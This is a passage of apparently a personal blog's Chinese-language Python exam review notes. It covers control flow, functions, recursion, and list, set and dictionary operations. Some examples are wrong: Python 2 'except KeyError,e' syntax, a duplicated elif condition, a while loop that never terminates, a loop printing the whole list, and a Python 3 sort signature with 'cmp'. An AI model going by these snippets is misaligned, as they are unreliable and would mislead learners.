numpy.<span class="built_in">min</span>(): 计算数组的最小值</span><br><span class="line"></span><br><span class="line">还有很多其他的函数，这里只列举了一部分。具体的函数可以查看NumPy的官方文档。</span><br></pre></td></tr></table></figure><p>说实在，这个模块真的挺让人头大的……</p><h2 id="更广泛的Python计算生态"><a href="#更广泛的Python计算生态" class="headerlink" title="更广泛的Python计算生态"></a>更广泛的Python计算生态</h2><p>更广泛的Python计算生态，只要求了解第三方库的名称，不限于以下领域：网络爬虫、数据分析、文本处理、数据可视化、用户图形界面、机器学习、Web开发、游戏开发等</p><pre><code>深度学习：TensorFlow, PyTorch, Keras, MXNet, Caffe, Theano自然语言处理：NLTK, Spacy, Gensim, TextBlob, Stanford CoreNLP数据库操作：SQLAlchemy, Psycopg2, PyMySQL, PyMongo数据可视化：Matplotlib, Seaborn, Plotly, Bokeh, AltairWeb开发：Django, Flask, Pyramid, Tornado, FastAPI, Bottle网络爬虫：Scrapy, Beautiful Soup, Requests, Selenium, PySpider游戏开发：Pygame, Panda3D, PyOpenGL, PyOgre, Cocos2D用户图形界面：Tkinter, PyQt, PyGTK, wxPython, Kivy数学计算：SymPy, SciPy, Statsmodels, Pandas, Dask图像处理：OpenCV, Pillow, Scikit-image, SimpleCV, Mahotas数据库连接：pymysql, psycopg2, sqlite3, mysql-connector-python, cx_Oracle调试和测试：pytest, unittest, doctest, nose, coverage机器学习：Scikit-learn, XGBoost, LightGBM, CatBoost, H2O大数据处理：PySpark, Dask, Vaex, PyHive, PyBigQuery</code></pre><p>讲真的，要是真的库库精通，那我不就成了库老了么😏……</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 计算机等级考试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-复习日志-0002</title>
      <link href="/2023/03/13/Python-Study-0002/"/>
      <url>/2023/03/13/Python-Study-0002/</url>
      
        <content type="html"><![CDATA[<p>程序控制，函数代码复用，组合数据类型</p><span id="more"></span><h1 id="程序的控制结构"><a href="#程序的控制结构" class="headerlink" title="程序的控制结构"></a>程序的控制结构</h1><h2 id="程序的三种控制结构"><a href="#程序的三种控制结构" class="headerlink" title="程序的三种控制结构"></a>程序的三种控制结构</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">顺序结构，分支结构，循环结构</span><br><span class="line"></span><br><span class="line">顺序结构：没什么好说的，从头走到尾的那种</span><br><span class="line"></span><br><span class="line">分支结构：</span><br><span class="line">    <span class="keyword">if</span>语句控制，true和false各占一种情况的那种</span><br><span class="line">    型如：</span><br><span class="line">        a = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> a &gt; <span class="number">100</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Ok 200&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> a &gt; <span class="number">100</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Ok 100&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;False!&quot;</span>)</span><br><span class="line"></span><br><span class="line">循环结构</span><br><span class="line"><span class="keyword">while</span>   循环，写法如：</span><br><span class="line">    a = -<span class="number">10</span></span><br><span class="line">    <span class="keyword">while</span> a &gt; <span class="number">0</span>:</span><br><span class="line">        a+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>     循环，应用范围较广，写法如：</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="built_in">print</span>(i,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="程序的分支结构"><a href="#程序的分支结构" class="headerlink" title="程序的分支结构"></a>程序的分支结构</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">单分支结构</span><br><span class="line">    <span class="keyword">if</span> a &gt; <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">二分支结构</span><br><span class="line">    <span class="keyword">if</span> a &gt; <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;No&#x27;</span>)</span><br><span class="line">多分支结构</span><br><span class="line">    <span class="keyword">if</span> a &gt; <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">elif</span> a &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;a&gt;5&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="程序的循环结构"><a href="#程序的循环结构" class="headerlink" title="程序的循环结构"></a>程序的循环结构</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">遍历循环</span><br><span class="line">    a = [<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;like&#x27;</span>,<span class="string">&#x27;Study&#x27;</span>]</span><br><span class="line">    <span class="comment"># 遍历数组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">条件循环</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(num,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line">无限循环</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;我是无限循环第&quot;</span>,num,<span class="string">&quot;次！&quot;</span>,sep=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>和<span class="keyword">continue</span>循环控制。</span><br><span class="line"><span class="keyword">break</span>    强制退出循环</span><br><span class="line"><span class="keyword">continue</span> 跳过当前循环</span><br></pre></td></tr></table></figure><h2 id="程序的异常处理"><a href="#程序的异常处理" class="headerlink" title="程序的异常处理"></a>程序的异常处理</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  <span class="comment"># 主代码块</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> KeyError,e:</span><br><span class="line">  <span class="comment"># 异常时，执行该块</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  <span class="comment"># 主代码块执行完，执行该块</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">  <span class="comment"># 无论异常与否，最终执行该块</span></span><br><span class="line">  <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h1 id="函数和代码复用"><a href="#函数和代码复用" class="headerlink" title="函数和代码复用"></a>函数和代码复用</h1><h2 id="函数的定义和使用"><a href="#函数的定义和使用" class="headerlink" title="函数的定义和使用"></a>函数的定义和使用</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. def定义函数：</span></span><br><span class="line"><span class="comment"># 函数代码块以 def 关键词开头，后接函数标识符名称和圆括号()</span></span><br><span class="line"><span class="comment"># 任何传入参数和自变量必须放在圆括号中间，圆括号之间可以用于定义参数，</span></span><br><span class="line"><span class="comment"># return[表达式] 结束函数，选择性地返回一个值给调用方。不带表达式的return相当于返回 None。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.函数的参数</span></span><br><span class="line"><span class="comment"># 默认参数：使用默认参数的时候，如果给形参传递了实参，则形参会接收实参的值。如果没有给这个形参传递实参，则形参会采用默认值。</span></span><br><span class="line"><span class="comment"># 位置参数：实参和形参的数量上必须要保持一致。</span></span><br><span class="line"><span class="comment"># 关键字参数：通过定义关键字获取实参的值，与形参的顺序无关。</span></span><br><span class="line"><span class="comment"># 可变参数：形参的数据会根据实参的数量的变化而变化。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单的定义一个函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">num=<span class="number">3</span>,e=<span class="number">45</span></span>):   <span class="comment"># 传入参数num，没参数则num默认为3</span></span><br><span class="line">    num += <span class="number">100</span>    <span class="comment"># 对传入的参数进行处理</span></span><br><span class="line">    <span class="keyword">return</span> num+e  <span class="comment"># 调用return将新的值返回</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数，传入参数20</span></span><br><span class="line"><span class="comment"># 传入参数的方式为名称传递</span></span><br><span class="line"><span class="comment"># e为可选参数</span></span><br><span class="line">a = fun(num=<span class="number">20</span>)</span><br><span class="line"><span class="comment"># 使用print函数输出函数的返回值</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><h2 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">局部变量和全局变量</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局变量，全局下可以调用</span></span><br><span class="line">num = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="comment"># 这里的num为局部变量，也就是局部的改变不会影响到全局</span></span><br><span class="line">    <span class="comment"># 如果num使用global声明为全局变量，则num的改变会影响到全局变量的num</span></span><br><span class="line">    num += <span class="number">100</span></span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数并且传入参数</span></span><br><span class="line">fun(num)</span><br></pre></td></tr></table></figure><h2 id="函数递归的定义和使用"><a href="#函数递归的定义和使用" class="headerlink" title="函数递归的定义和使用"></a>函数递归的定义和使用</h2><p>递归函数挺简单，也挺麻烦的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 功能：传入一个参数num，计算从1累加到num的和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">if</span>(num&gt;=<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> fun(num-<span class="number">1</span>) + num</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出最终结果</span></span><br><span class="line"><span class="built_in">print</span>(fun(<span class="number">10</span>)) <span class="comment"># 输出结果为：55</span></span><br><span class="line"><span class="built_in">print</span>(fun(<span class="number">3</span>))  <span class="comment"># 输出结果为：6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 递归函数使用内存分析法理解较为简单，用来解决问题对我来说难度有点大了</span></span><br><span class="line"><span class="comment"># 此处仅是复习，详细细节不赘述，有机会再补充。</span></span><br></pre></td></tr></table></figure><h1 id="组合数据类型"><a href="#组合数据类型" class="headerlink" title="组合数据类型"></a>组合数据类型</h1><h2 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h2><h3 id="创建、索引、切片"><a href="#创建、索引、切片" class="headerlink" title="创建、索引、切片"></a>创建、索引、切片</h3><p>简单罗列下吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">创建</span><br><span class="line">    a = []                              <span class="comment"># 生成空白列表</span></span><br><span class="line">    a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&quot;sec&quot;</span>]                   <span class="comment"># 生成带元素的列表</span></span><br><span class="line">    a = <span class="built_in">list</span>()                          <span class="comment"># 生成空白列表</span></span><br><span class="line">    a = <span class="built_in">list</span>(<span class="built_in">range</span>(start,end [,step]))  <span class="comment"># 利用list+range生成</span></span><br><span class="line">    a = [ i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>)]       <span class="comment"># 列表推导式</span></span><br><span class="line"></span><br><span class="line">索引</span><br><span class="line">    a[index]                            <span class="comment"># index表示下标值，通过下标获取元素</span></span><br><span class="line">    a.index(x[,start[,end]])            <span class="comment"># 在列表a当中，从start开始到end结束寻找x元素的下标值。</span></span><br><span class="line"></span><br><span class="line">切片</span><br><span class="line">    a[start:end:step]                   <span class="comment"># 从start开始到end结束，截取步长为step的列表元素</span></span><br><span class="line"></span><br><span class="line">举个例子</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>][<span class="number">1</span>:<span class="number">3</span>:<span class="number">1</span>]</span><br><span class="line">[<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>][<span class="number">1</span>:<span class="number">5</span>:<span class="number">2</span>]</span><br><span class="line">[<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>][::-<span class="number">1</span>]</span><br><span class="line">[<span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure><h3 id="相关操作方法"><a href="#相关操作方法" class="headerlink" title="相关操作方法"></a>相关操作方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>.append(obj)        <span class="comment"># 在列表末尾添加新的对象</span></span><br><span class="line"><span class="built_in">list</span>.extend(seq)        <span class="comment"># 在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</span></span><br><span class="line"><span class="built_in">list</span>.insert(index,obj)  <span class="comment"># 将对象插入列表</span></span><br><span class="line"><span class="built_in">list</span>.pop([index=-<span class="number">1</span>])    <span class="comment"># 移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</span></span><br><span class="line"><span class="built_in">list</span>.remove(obj)        <span class="comment"># 移除列表中某个值的第一个匹配项</span></span><br><span class="line"><span class="built_in">list</span>.reverse()          <span class="comment"># 反向列表中元素</span></span><br><span class="line"><span class="built_in">list</span>.sort(cmp=<span class="literal">None</span>,key=<span class="literal">None</span>, reverse=<span class="literal">False</span>)</span><br><span class="line">                    <span class="comment"># 对原列表进行排序</span></span><br><span class="line">                        reverse 用于指定排序是否为降序，默认为 <span class="literal">False</span> 即升序排序。</span><br><span class="line">                        key 用于指定排序的关键字函数，该函数接受一个列表中的元素，返回用于排序的关键字。默认为 <span class="literal">None</span>，表示以元素本身作为排序依据。</span><br><span class="line">                            比如：key=<span class="built_in">len</span></span><br><span class="line">                        cmp 用于指定排序时的比较函数，该函数接受两个参数，如果第一个参数小于第二个参数，则返回负数，如果两个参数相等，则返回零，如果第一个参数大于第二个参数，则返回正数。默认为 <span class="literal">None</span>，表示使用 Python 内置的比较函数进行排序。</span><br><span class="line"><span class="built_in">list</span>.count(obj)     <span class="comment"># 统计某个元素在列表中出现的次数</span></span><br><span class="line"><span class="built_in">list</span>.clear()    <span class="comment">#清除所有的元素</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="string">&#x27;Hello&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;am&#x27;</span>,<span class="string">&#x27;Github&#x27;</span>]</span><br><span class="line">a.append(<span class="number">12</span>)    <span class="comment"># 尾部新增</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a.extend([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>]) <span class="comment"># 尾部追加</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a.insert(<span class="number">1</span>,<span class="string">&#x27;????&#x27;</span>) <span class="comment"># 指定索引位置插入</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a.pop(<span class="number">0</span>)    <span class="comment"># 删除指定位置元素</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a.remove(<span class="number">3</span>) <span class="comment"># 删除指定元素3的所有情况的头一个</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a.reverse() <span class="comment"># 列表排序颠倒</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a.count(<span class="number">3</span>))   <span class="comment"># 计算指定元素的个数</span></span><br><span class="line"><span class="comment"># ---CMD输出--- #</span></span><br><span class="line">[<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Github&#x27;</span>, <span class="number">12</span>]</span><br><span class="line">[<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Github&#x27;</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>]</span><br><span class="line">[<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;????&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Github&#x27;</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>]</span><br><span class="line">[<span class="string">&#x27;????&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Github&#x27;</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>]</span><br><span class="line">[<span class="string">&#x27;????&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;Github&#x27;</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>]</span><br><span class="line">[<span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="string">&#x27;Github&#x27;</span>, <span class="string">&#x27;am&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;????&#x27;</span>]</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="comment"># ---sort--- #</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">[<span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.sort(reverse=<span class="literal">False</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="集合类型"><a href="#集合类型" class="headerlink" title="集合类型"></a>集合类型</h2><p>集合（Set）是一种无序、可变的容器，其中的元素不允许重复。可以使用大括号 {} 或 set() 函数来创建</p><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个空集合</span></span><br><span class="line">empty_set = <span class="built_in">set</span>()</span><br><span class="line"><span class="built_in">print</span>(empty_set) <span class="comment"># set()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过大括号创建集合</span></span><br><span class="line">set1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(set1) <span class="comment"># &#123;1, 2, 3&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过set()函数创建集合</span></span><br><span class="line">set2 = <span class="built_in">set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(set2) <span class="comment"># &#123;1, 2, 3&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过set()函数创建集合（使用字符串）</span></span><br><span class="line">set3 = <span class="built_in">set</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(set3) <span class="comment"># &#123;&#x27;e&#x27;, &#x27;h&#x27;, &#x27;o&#x27;, &#x27;l&#x27;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="操作符、操作函数和操作方法"><a href="#操作符、操作函数和操作方法" class="headerlink" title="操作符、操作函数和操作方法"></a>操作符、操作函数和操作方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span>()：             <span class="comment"># 创建一个空集合或从可迭代对象创建一个集合。</span></span><br><span class="line"><span class="built_in">len</span>()：             <span class="comment"># 返回集合的元素数量。</span></span><br><span class="line">add()：             <span class="comment"># 向集合添加元素，如果元素已经存在则不进行任何操作。</span></span><br><span class="line">clear()：           <span class="comment"># 清空集合中的所有元素。</span></span><br><span class="line">pop()：             <span class="comment"># 随机删除并返回集合中的一个元素，如果集合为空则抛出KeyError异常。</span></span><br><span class="line">symmetric_difference()： <span class="comment"># 返回两个集合的对称差集。</span></span><br><span class="line">difference()：      <span class="comment"># 返回两个集合的差集。</span></span><br><span class="line">union()：           <span class="comment"># 返回两个集合的并集。</span></span><br><span class="line">update()：          <span class="comment"># 向集合添加多个元素，参数可以是集合或可迭代对象。</span></span><br><span class="line">remove()：          <span class="comment"># 从集合中删除指定元素，如果元素不存在则会抛出KeyError异常。</span></span><br><span class="line">discard()：         <span class="comment"># 从集合中删除指定元素，如果元素不存在则不进行任何操作。</span></span><br><span class="line">intersection()：    <span class="comment"># 返回两个集合的交集。</span></span><br><span class="line">issubset()：        <span class="comment"># 判断一个集合是否是另一个集合的子集。</span></span><br><span class="line">issuperset()：      <span class="comment"># 判断一个集合是否是另一个集合的超集。</span></span><br><span class="line">copy()：            <span class="comment"># 返回一个集合的浅拷贝。</span></span><br></pre></td></tr></table></figure><h2 id="字典类型"><a href="#字典类型" class="headerlink" title="字典类型"></a>字典类型</h2><h3 id="创建、索引"><a href="#创建、索引" class="headerlink" title="创建、索引"></a>创建、索引</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">创建</span><br><span class="line"><span class="comment"># 空字典</span></span><br><span class="line">empty_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 包含元素的字典</span></span><br><span class="line"><span class="comment"># dict = &#123;key:value,key1:value1,...&#125;</span></span><br><span class="line">my_dict = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Alice&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;female&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">索引：</span><br><span class="line"><span class="comment"># 获取键对应的值</span></span><br><span class="line">empty_dict[key]</span><br><span class="line">empty_dict.get(key)</span><br></pre></td></tr></table></figure><h3 id="操作符、操作函数、操作方法"><a href="#操作符、操作函数、操作方法" class="headerlink" title="操作符、操作函数、操作方法"></a>操作符、操作函数、操作方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">操作符:</span><br><span class="line">    <span class="keyword">in</span> ,<span class="keyword">not</span> <span class="keyword">in</span>,==       <span class="comment"># 判断键是否存在/不存在，键值是否相等</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> empty_dict:</span><br><span class="line">        <span class="built_in">print</span>(empty_dict[key])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">操作函数：</span><br><span class="line">    <span class="built_in">len</span>(<span class="built_in">dict</span>)：     <span class="comment"># 返回字典中键值对的数量。</span></span><br><span class="line">    <span class="built_in">sorted</span>(<span class="built_in">dict</span>)：  <span class="comment"># 返回按照键排序的键值对的列表。</span></span><br><span class="line"></span><br><span class="line">操作方法：</span><br><span class="line">    <span class="built_in">dict</span>.clear()：       <span class="comment"># 清空字典中所有的键值对。</span></span><br><span class="line">    <span class="built_in">dict</span>.copy()：        <span class="comment"># 返回字典的浅复制。</span></span><br><span class="line">    <span class="built_in">dict</span>.fromkeys(seq[, value])： <span class="comment"># 创建一个新字典，以seq中的元素为键，值都设置为value（默认为None）。</span></span><br><span class="line">    <span class="built_in">dict</span>.get(key[, default])： <span class="comment"># 返回指定键的值，如果键不存在则返回默认值。</span></span><br><span class="line">    <span class="built_in">dict</span>.items()：       <span class="comment"># 返回字典的键值对视图。</span></span><br><span class="line">    <span class="built_in">dict</span>.keys()：        <span class="comment"># 返回字典的键视图。</span></span><br><span class="line">    <span class="built_in">dict</span>.update(dict2)： <span class="comment"># 将字典dict2的键值对更新到当前字典中，如果键已存在则更新值，否则添加键值对。</span></span><br><span class="line">    <span class="built_in">dict</span>.values()：      <span class="comment"># 返回字典的值视图。</span></span><br><span class="line">    <span class="built_in">dict</span>.pop(key[, default])： <span class="comment"># 删除并返回指定键的值，如果键不存在则返回默认值。</span></span><br><span class="line">    <span class="built_in">dict</span>.popitem()：     <span class="comment"># 随机弹出字典中的一项，并返回该键值对。</span></span><br><span class="line">    <span class="built_in">dict</span>.setdefault(key[, default])： <span class="comment"># 返回指定键的值，如果键不存在则添加该键值对并返回默认值。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Python3移除的方法</span></span><br><span class="line">    <span class="built_in">dict</span>.has_key(key)    <span class="comment"># 如果键在字典dict里返回true，否则返回false</span></span><br><span class="line">                         <span class="comment"># 此方法可以使用 “in”来替代</span></span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span> = &#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span></span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>[<span class="string">&#x27;name&#x27;</span>]=<span class="string">&#x27;syw&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>[<span class="string">&#x27;age&#x27;</span>]=<span class="number">18</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span>[<span class="string">&#x27;school&#x27;</span>]=<span class="string">&#x27;stzyjsxy&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dict</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;syw&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;school&#x27;</span>: <span class="string">&#x27;stzyjsxy&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict0 = <span class="built_in">dict</span>.copy()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict0</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;syw&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;school&#x27;</span>: <span class="string">&#x27;stzyjsxy&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict0 = <span class="built_in">dict</span>.copy()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict0</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;syw&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;school&#x27;</span>: <span class="string">&#x27;stzyjsxy&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict1.fromkeys(b)</span><br><span class="line">&#123;<span class="string">&#x27;key-0&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;key-1&#x27;</span>: <span 